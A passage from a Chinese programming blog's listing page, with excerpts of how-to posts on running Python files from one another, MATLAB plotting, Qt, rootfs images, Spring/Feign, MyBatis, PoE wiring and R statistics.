2.2 代码示例 # 导入模块 import another_module # 调用函数或访问变量 another_module.some_function() print(another_module.some_variable) 2.3 代码解释 import another_module：导入名为another_module的模块，该模块的py文件名为another_module.py。another_module.some_function()：调用another_module模块中的some_function()函数。another_module.some_variable：访问another_module模块中的some_variable变量。 3. 方法二：使用exec()函数 3.1 步骤 使用Python内置的exec()函数可以执行字符串中的Python代码。因此，我们可以通过读取另一个py文件的内容，并将其作为字符串参数传递给exec()函数来实现在一个py文件中运行另一个py文件。
3.2 代码示例 # 读取py文件内容 with open("another_file.py", "r") as f: code = f.read() # 执行py文件内容 exec(code) 3.3 代码解释 open("another_file.py", "r")：打开名为another_file.py的文件，并以只读模式进行操作。f.read()：读取文件内容，并将其存储在变量code中。exec(code)：执行变量code中的Python代码。 4. 方法三：使用命令行 4.1 步骤 在命令行中使用python命令可以执行一个py文件。因此，我们可以通过在当前py文件中调用命令行来运行另一个py文件。
4.2 代码示例 import os # 运行py文件 os.system("python another_file.py") 4.3 代码解释 import os：导入Python内置的os模块，用于执行操作系统相关的功能。os.system("python another_file.py")：在命令行中执行python another_file.py命令，从而运行名为another_file.py的py文件。 5. 总结 通过以上三种方法，我们可以在一个py文件中运行另一个py文件。具体选择哪种方法取决于需求和个人偏好。其中，导入模块的方法更加规范和灵活，适合在代码中频繁调用其他py文件中的函数和变量；使用exec()函数的方法适合在需要动态执行代码的情况下使用；使用命令行的方法适合在需要以子进程的方式执行另一个py文件时使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/793d023e452b979f26db6eea04fefb36/" rel="bookmark">
			matlab绘制球体、正方体、正四面体、圆锥体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、球体绘制 [x, y, z] = sphere(20); surf(x, y, z); 此处利用sphere函数，该函数会生成一个球体的顶点数据，即生成一个20x20的球面网格，调用此函数过后matlab会生成一个半径为一的单位球体，同时将各个球面顶点的坐标保存在x,y,z数组中，再通过surf函数进行球面绘制
二、正方体绘制 % 绘制正方体 cube_vertices = [ 0 0 0; 0 1 0; 1 1 0; 1 0 0; 0 0 1; 0 1 1; 1 1 1; 1 0 1 ]; cube_faces = [ 1 2 3 4; 1 2 6 5; 2 3 7 6; 3 4 8 7; 4 1 5 8; 5 6 7 8 ]; for i = 1:size(cube_faces, 1) face_vertices = cube_vertices(cube_faces(i, :), :); patch('Vertices', face_vertices, 'Faces', 1:4, 'FaceColor', 'blue'); end axis equal; view(3); 首先定义正方体的八个顶点，即cube_vertices为一个8x3的矩阵，其中每一行都分别对应顶点的x,y,z坐标点，然后正方体有6个面，而每一个面由四个顶点构成，于是cube_faces是6x4的矩阵，其中对应的1234此类数字是用来索引顶点的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/793d023e452b979f26db6eea04fefb36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83e63dc82c4904c900ac2f9cdb6d5ef2/" rel="bookmark">
			Qt QString界面显示中文乱码问题-已解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在cpp文件中加入：#pragma execution_character_set("utf-8")
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58280415ac5a14802dcf3b6d248434a5/" rel="bookmark">
			Qt 自定义类时，手动添加 Q_OBJECT 出现错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如图所示： 原因：没有自动生成 moc_ 文件。 可以去看一看自己项目文件里，我看了确实没有。
起因：创建类时 没有选择父类 或者 手动创建的 .h 和 .cpp 文件
解决办法：
1.最直接的：重新创建类，选择父类，系统会自动生成 Q_OBJECT
2.原文件中手动添加
Qt错误总结--关于宏Q_OBJECT_q_object生成解决方案报错-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/055cd372f1bcc2c4d983313f3e4f0d2a/" rel="bookmark">
			rootfs根文件系统镜像制作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://t.csdnimg.cn/2xKLM
在嵌入式linux平台中，大部分工作则是填充根文件系统，在开发中，根文件系统一般都是以目录的方式放在开发宿主机上。
当根文件系统填充完成后，我们需要将其打包成xxx.img或者其他的镜像格式。本文以xxx.img镜像格式为例，描述如何将根文件系统打包成img的镜像文件。
本文打包的根文件系统目录结构和文件如下图所示：
（文件和目录有点乱，不影响）
这些目录和文件都存放在rootfs目录下。
我们在rootfs目录的同级目录下打开linux终端，输入如下命令：
dd if=/dev/zero of=rk3568.img bs=1M count=2000
1
如下图所示：
上图中：
dd ：是linux命令，用于读取、转换并输出数据。
if ：表示输入文件。
of ：表示输出文件。
bs ： 表示块大小。
count ：表示被复制的块数。
上述命令的意思则是创建一个2000M（约2G）的文件，内容全部填充为0。
运行上述命令后，则会创建一个rk3568.img的文件，接下来就创建一个ext4的文件系统镜像。
在终端输入：
sudo mkfs.ext4 -F -L linuxroot rk3568.img
1
如下图所示：
sudo mkfs.ext4 ：为linux命令，用于对磁盘设备进行Ext4格式化的操作。
-F ：表示强制格式化。
-L ：设置卷标。这里则是linuxroot
rk356.img : 则是设备。
然后在终端输入下列命令：
mkdir tmpfs
1
创建一个tmpfs文件。其中mkdir为linux命令，用于创建一个目录；tmpfs为名录名称（可自定义）。
接着使用下列命令：
sudo mount rk3568.img tempfs/
1
将rk3568.img文件系统挂载到tmpfs。
使用下列命令，将rootfs目录下的目录和文件拷贝到tmpfs目录：
sudo cp -rfp rootfs/* tmpfs/
1
完成后，使用下列命令卸载文件系统：
sudo umount tmpfs/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/055cd372f1bcc2c4d983313f3e4f0d2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/546bd573ac7361e030103b4238973963/" rel="bookmark">
			端口占用Identify and stop the process that‘s listening on port 8083 or configure this application to lis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候项目的异常退出会导致进程未结束，这时候idea再次运行该项目会提示端口号被占用
一、这时候可以先win+R，再输入cmd，进入资源管理器
二、netstat -aon|findstr "8083"查看指定端口被占用情况，获取到对应的pid，如果直接输入netstat -aon获取的是所有的端口号的占用情况
三、可以直接在资源管理器输入taskkill /pid 8083 /f关闭进程，也可以在任务管理器搜索pid关闭进程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48ac7a959d197866dac92ff7d9136164/" rel="bookmark">
			【SpringCloud-Feign】SpringCloud项目通过fegin远程调用接口返回结果类型为LinkedHashMap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： SpringCloud项目通过fegin远程调用接口返回结果类型转换失败。
问题描述 SpringCloude项目通过fegin远程调用接口返回linkedHashMap，导致报错java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.xx.xx.xx.model.xxBean。
具体操作流程为：
A服务提供外部查询接口，调用接口时将结果对象序列化存到redis中；B服务通过feign调用A接口，获取结果，然后将结果转换为想要的bean对象；B调用接口返回报错类型转换失败； A服务接口实现：
原因分析： 通过debug发现通过feign方法调用返回结果是LinkedHashMap类型，导致类型转换失败，如下图： 接口调用：
返回结果：
转换过程：
2. 转换为具体的Bean对象时导致无法转换；
3. 原因：
1 、Spring Cloud中，当使用Feign客户端进行服务间远程调用时，可能会出现接口调用方期望得到一个特定的对象类型，但实际上收到的确实java.util.LinkedHashMap类型的情况。这出现的原因主要和Java泛型在运行时的类型擦除以及远程HTTP响应的序列化/反序列化机制有关。
2、在Java中，泛型信息在编译时会进行类型擦除，只有原始类型会保留下来。当Feign客户端接收到远程服务的HTTP响应时，因为泛型信息已经不存在，所以Feign的解码器（默认使用Jackson或Gson）会将JSON响应转换成最接近的映射类型，也就是LinkedHashMap，特别是当它不确定具体应该转换为哪种Java对象类型时。
3、LinkedHashMap是Java中的一种实现了Map接口的类，它继承自HashMap，并且保持了元素的插入顺序。因此，使用LinkedHashMap作为默认的返回结果类型可以保留远程接口返回数据的顺序。
另一种说法：
因为rpc远程调用在底层还是使用的HTTPClient，所以在传递参数的时候，必定要有个顺序，当你传递map的时候map里面的值也要有顺序，不然服务层在接的时候就出问题了，所以它才会从map转为linkedhashMap！spring 有一个类叫ModelMap，继承了linkedhashMap ,所以一个接口返回的结果就可以直接用ModelMap来接，注意ModelMap是没有泛型的，不管你返回的结果是什么类型的map，泛型是多复杂的map，都可以直接new一个Modelmap，用它来接返回的结果。
解决方案： 调用外部服务获取结果后，对结果进行加工处理，对返回结果进行map转bean处理，比较笨。
使用具体的类代替泛型类型：在Feign客户端的接口定义中，使用具体的类代替泛型。这样可以避免由于类型擦除导致的问题。自定义编解码器：提供自定义的JSON编解码器，这样可以在反序列化时指定确切的类型。容错处理：可以在客户端逻辑中增加对LinkedHashMap的处理，使得代码可以灵活处理不同的返回类型。 可根据项目实际情况选择合适的处理方式！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a2547a5a050924452d145ea9774f053/" rel="bookmark">
			使用Java17获取指定日期，星期几、周、月、季度、年，第一天与最后一天日期获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java17获取日期 使用Java17获取指定日期，星期几、周、月、季度、年，第一天与最后一天日期获取
1. 获取日期代码 /** * description: 使用Java17获取指定日期，星期几、周、月、季度、年，第一天与最后一天日期获取 * * @author:jinshengyuan * @date: 2023/12/14 */ @Test public void getDateUseJava17(){ //使用java.time.LocalDate类获取当前时间 LocalDate date = LocalDate.now(); System.out.println("今天星期几？===&gt;"+date.getDayOfWeek()); System.out.println("当前月份===&gt;"+date.getMonthValue()); LocalDate lastDayOfPreviousWeek = date.with(TemporalAdjusters.previousOrSame(DayOfWeek.SUNDAY)); System.out.println("上周的最后一天：" + lastDayOfPreviousWeek); LocalDate lastDayOfWeek = date.with(TemporalAdjusters.nextOrSame(DayOfWeek.SUNDAY)); System.out.println("本周的最后一天：" + lastDayOfWeek); //本月第一天、最后一天 LocalDate firstDayOfMonth = date.with(TemporalAdjusters.firstDayOfMonth()); System.out.println("本月第一天：" + firstDayOfMonth); LocalDate lastDayOfMonth = date.with(TemporalAdjusters.lastDayOfMonth()); System.out.println("本月最后一天：" + lastDayOfMonth); //获取季度 int quarter = (date.getMonthValue() - 1) / 3 + 1; System.out.println("当前第"+quarter+"季度"); LocalDate previousDayOfQuarter = date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a2547a5a050924452d145ea9774f053/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe2f57094ba3cf7b7a103932aa6dd1fe/" rel="bookmark">
			一文掌握Spring Boot热部署技巧，告别频繁重启！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		频繁地重启应用，导致开发效率降低，加班随之而来。有没有什么办法，能让 Spring Boot 项目热部署呢，从而不用每次都手点。答案是肯定的。
第一步：添加 spring-boot-devtools 依赖 Spring Boot 提供了 spring-boot-devtools, 它能在我们修改类或者配置文件后，自动感知，重新启动应用。我们只需要在 pom.xml 文件中，添加下面依赖：
&lt;!-- SpringBoot自带热加载开发工具 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; 第二步：设置 Idea 由于 Idea 默认是没有开启自动编译功能的，我们还需要做以下设置：
1.单击左上角 File -&gt; Setting -&gt; Build, Execution, Deployment -&gt; compiler, 勾选 Build project automatically:
2.windowns 系统按快捷键 Shift+Ctrl+Alt+/ ， 单击 Registry，勾选 compiler.automake.allow.when.app.running：
添加完成后，重启应用。为了验证热部署是否集成成功，我们将接口的路径改一下，保存：
package site.exception.springboothello.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class TestController { @GetMapping("/hellospringboot") String hello() { return "Hello, Spring Boot !"; } } 观察控制台，打印了项目的启动日志,证明 Spring Boot 已经检测到了 class 文件发生了变化，自动重启了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe2f57094ba3cf7b7a103932aa6dd1fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e9f835c776d7feb534980dbd307b095/" rel="bookmark">
			mybatis动态SQL-sql片段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、建库建表 create database `mybatis-example`; use `mybatis-example`; create table emp ( empNo varchar(40), empName varchar(100), sal int, deptno varchar(10) ); insert into emp values('e001','张三',8000,'d001'); insert into emp values('e002','李四',9000,'d001'); insert into emp values('e003','王五',10000,'d001'); insert into emp values('e004','赵六',11000,'d002'); insert into emp values('e005','田七',12000,'d002'); insert into emp values('e006','周八',13000,'d003'); insert into emp values('e007','吴九',14000,'d004'); insert into emp values('e008','郑十',15000,'d004'); insert into emp values('d8f9b794-95ba-11ee-ab75-84a93ea22bfb','张三丰',16000,'d001'); 2、pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- MySQL驱动 mybatis底层依赖jdbc驱动实现,本次不需要导入连接池,mybatis自带! --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e9f835c776d7feb534980dbd307b095/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf5c4960690ee2f94b161e5e1fe70b91/" rel="bookmark">
			对局域网络中应用了网络变压器 POE供电功能的供电端设备间的连接方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hqst华轩盛(石门盈盛)电子导读：一起来了解局域网络中应用了网络变压器 POE供电功能的设备间的来连接方法
POE标准为使用以太网的传输电缆输送直流电到POE兼容的设备定义了两种连接方法:
第一,中间跨接法
一种称作"中间跨接法"( Mid -Span ),使用独立的PoE供电设备，跨接在交换机和具有PoE功能的终端设备之间，一般是利用以太网电缆中没有被使用的空闲线对来传输直流电。Midspan PSE是一个专门的电源管理设备,通常和交换机放在一起。它对应每个端口有两个RJ45插孔,一个用短线连接至交换机(此处指传统的不具有PoE功能的交换机),另一个连接远端设备。 商业级24PIN千兆单口网络变压器H82463SP 第二,末端跨接法
另一种方法是"末端跨接法"(End-Span),是将供电设备集成在交换机中信号的出口端，这类集成连接一般都提供了空闲线对和数据线对"双"供电功能。其中数据线对采用了信号隔离变压器，并利用中心抽头来实现直流供电。可以预见,End-Span会迅速得到推广,这是由于以太网数据与输电采用公用线对,因而省去了需要设置独立输电的专用线,这对于仅有8芯的电缆和相配套的标准RJ-45插座意义特别重大。
商业级24PIN千兆单口网络变压器H82463SP 对局域网络中应用了网络变压器 POE供电功能的供电端设备间的连接有所了解了吗？
接下来Hqst 盛生将继续给大家分享网络变压器和与之配套的RJ45 网络连接器的相关知识，方便大家认识网络变压器和RJ系列网口产品，不足之处欢迎讨论；
感兴趣的朋友，可以继续关注！专业网络变压器/RJ45网口连接器，尽在Hqst；#网络变压器，#电子元器件，#网络滤波器，#脉冲变压器，#网口变压器模块；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6c2fb0a4022eb54768ea42958f4b76f/" rel="bookmark">
			GitHub Universe 2023 Watch Party in Shanghai：在开源世界中找到真我
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 ⭐ 前言⭐ “我”的开源之旅⭐ 为什么要做开源⭐ 要如何做好开源⭐ 开源的深度影响⭐ 小结 ⭐ 前言 周末有幸参加了在上海举行的 GitHub Universe 2023 Watch Party，这是一个充满激情和活力的开源开发者日。我有幸聆听了一场特别令人印象深刻的演讲，由 Tw93老师 分享了他的开源旅城，以及开源项目对他生活和职业发展的影响。有一说一，这是一场深深打动我内心的分想！
⭐ “我”的开源之旅 Tw93老师 的开源之旅充满了挑战与收获。他回首自己的旅程，犹如温故而知新，每一次的成长都离不开开源的陪伴。
他的开源之旅始于一个简单的编程项目，那时的他对编程的理解还很初级。然而，通过参与开源项目，他开始接触到大量的代码，学习到了很多编程的知识和技巧。他逐步理解到，编程不仅仅是一种技术，更是一种思维方式，是一种解决问题的工具。在这个过程中，他在开源社区找到了属于自己的一片天地。
随着时间的推移，他的技术水平不断提高，开始尝试向开源项目中贡献代码，从一个纯粹的开源项目使用者，变成了一个开源项目的贡献者。他开始了解到，开源不仅仅是一种编程技术的传播方式，更是一种合作和共享的精神。在这个过程中，他体验到了真正的团队协作，学会了如何与他人有效沟通，如何解决困难和挑战。
然而，这个过程并不是一帆风顺的。他也面临过很多困难和挑战，比如如何理解他人的代码，如何解决复杂的问题，如何与不同的人沟通等等。但是，他并没有因此而放弃，而是通过这些挑战来提升自己的技能和能力。他深深地理解到，只有通过实际的操作和实践，才能真正提升自己的能力。
在他的开源之旅中，他不仅提升了自己的技术水平，也提升了自己的人际交往能力。他在项目中与全球的开发者一起协作，共同解决问题。他从这些人身上学到了很多，也给他们带来了很多。他说，这是他最宝贵的经历，也是他最美好的回忆。
如今，Tw93老师 已经成为了一名资深的开源项目贡献者，他的开源之旅还在继续。他希望，通过他的分享，可以激励更多的人走上开源的道路，一起分享知识，一起进步，一起成长。
⭐ 为什么要做开源 对于为什么要做开源，Tw93老师 有自己的理解和体验。首先，开源可以帮助个人提升技术能力。通过阅读和理解别人的代码，学习优秀的设计思想和编程技巧，可以极大地提高个人的编程能力。同时，开源项目往往涵盖各种复杂的实际问题，参与和贡献开源项目可以让我们在实战中不断提升，迅速提高技术解决问题的能力。
开源反馈社区，让技术知识得以共享和传播。Tw93老师 认为，知识是用来分享的，开源就是这种分享精神的体现。开源项目是全球开发者共同的成果，每个人都可以从中受益，同时也可以贡献自己的力量。这种互助互惠，使得个人的技术成长和社区的发展形成良性循环。
在开源项目中通常需要与各种不同背景、不同水平的开发者进行合作和交流，这对提升个人的沟通协作能力，拓宽视野具有很大的帮助。同时，开源项目也是展示个人技术水平和才华的一个很好的平台，也是建立个人在行业内影响力的重要途径。开源推动了软件技术的快速发展和创新，提高了软件质量，降低了开发成本。它帮助形成了一个充满活力和创新的技术社区，推动了全球范围内的技术交流和合作。因此，做开源，不仅是对个人技术成长的投资，也是对整个行业的贡献。
⭐ 要如何做好开源 结合自身经验提到，要做好开源，首先就需要选择一个自己感兴趣，且对社区有贡献的项目。一个人对于项目的热情以及其可能带来的影响力，是推动项目持续进步的重要动力。
在项目开始阶段，需要预先做好周密规划。包括整体的设计方案，模块划分，需要解决的关键问题及其可能的解决方案等等。当然了，也需要设定项目的长期目标和短期计划，以便持续跟进和优化。
同事，编写高质量的代马也是必须的。你的代马不仅需要解决问题，还需要易于理解和维护。要尽可能地遵守编程规范，代码注释要做到位，同时编写一定的单元测试来保证代码的稳定性。
然后，持续维护项目，及时解决在使用中出现的问题，不断优化项目的性能和用户体验。同时，也要积极与社区的其他开发者交流，学习他们的建议和反馈，以便更好地改进项目。
此外，建立良好的项目文档也是非常重要的。良好的文档可以帮助其他开发者更好地理解和使用你的项目，同时也能提升项目的影响力和认可度。无论是回复问题，还是处理pull request，都需要有足够的耐心和尊重。开源是一个基于互信和分想的社区，真诚善待每一个参与者，才能获得他们的信任和支持，进而促进项目的长期发展。
⭐ 开源的深度影响 通过参与开源项目，不仅能深化我们的编程技能，还能学习如何与来自世界各地的开发者协作，如何管理和维护一个项目。这些都对我们的个人的成长，尤其是领导和管理团队方面，有着极其重要的影响。
首先，通过开源，我们不仅能学到如何与不同背景、不同语言、不同文化的人协作。这种跨文化、跨地域的协作经历，不仅能提升我们的沟通能力和协调能力，还能够使我我们更好的理解和接纳团队成员的多样性，增强了团队的凝聚力。
其次，开一个好的项目不仅仅是代码质量的问题，更重要的是是否有一个清晰的目标，周全的设计和良好的文档。在带团队时，更应该注重整体的规划和明确的目标设定，以及文档的编写和维护。通过实践提升自身的技能，并借鉴好的实践回到团队中，从而提高团队的效率和质量。
再者，开源能让我们了解到持续维护和优化是非常重要的。因此，Tw93老师 在带团队时，会定期进行代码审查和性能优化，保持项目的活力。同时，在听取 Tw93老师 的分享，我也明白了决策的重要性，以及决策时需要考虑的各种因素，这使我在处理团队中的问题时，能更全面地考虑并做出最合理的决定。
总结来说，Tw93老师 的分享对我的影响是全方位的，它改变了我看待编程、看待团队、看待工作和生活的方式。我深信，这种影响也会通过我，影响到我的团队，使我们的团队更加高效、和谐和有成就感。
⭐ 小结 Tw93老师 的开源分享演讲让我对开源有了新的认识。开源不仅是一种代码的开放方式，更是一种精神，一种态度，一种生活方式。我希望我自己也能像 Tw93老师 一样，在开源的道路上不断前进，不断学习，不断成长。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96ef9c30a00b13772f72ad64cf5b9d29/" rel="bookmark">
			使用R语言做基本的统计分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍使用R语言做基本的统计分析，统计分析的数据集为某一国家的保险收费情况，该数据集主要用于分析影响保险收入大小的因素，数据集的第一行依次是年龄、性别、体重指数、孩子数量、是否吸烟、所在区域、保险收费。
数据集如下表：
（1）将数据集导入R中，并进行分析。
df&lt;-read.csv('f:/桌面/insurance.csv')
df
运行如下：
（2）对数据集做总体描述，在这里主要对保险费数据进行统计分析。
summary(df$charges)
得到：
均值：
mean(df$charges)
[1] 13270.42
分位数： quantile(df$charges)
0% 25% 50% 75% 100% 1121.874 4740.287 9382.033 16639.913 63770.428 偏度和峰度：
library(fBasics)
skewness(df$charges)
[1] 1.512483
&gt; kurtosis(df$charges)
[1] 1.588954
极差、四分位极值函数、标准差，方差：
&gt; max(df$charges)-min(df$charges)
[1] 62648.55
&gt; IQR(df$charges)
[1] 11899.63
&gt; sd(df$charges)
[1] 12110.01
&gt; var(df$charges)
[1] 146652372
（3）数据的图形描述
1、直方图，进行数据分布的频率或频数分析
这里主要分析女性家庭成员的保险缴费情况。
dff&lt;-df[df$sex=='female',]
attach(dff)
hist(charges,xlab='charges')
运行如下：
2、茎叶图
stem(dff$charges)
运行得到：
The decimal point is 4 digit(s) to the right of the |
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96ef9c30a00b13772f72ad64cf5b9d29/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/34/">«</a>
	<span class="pagination__item pagination__item--current">35/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/36/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>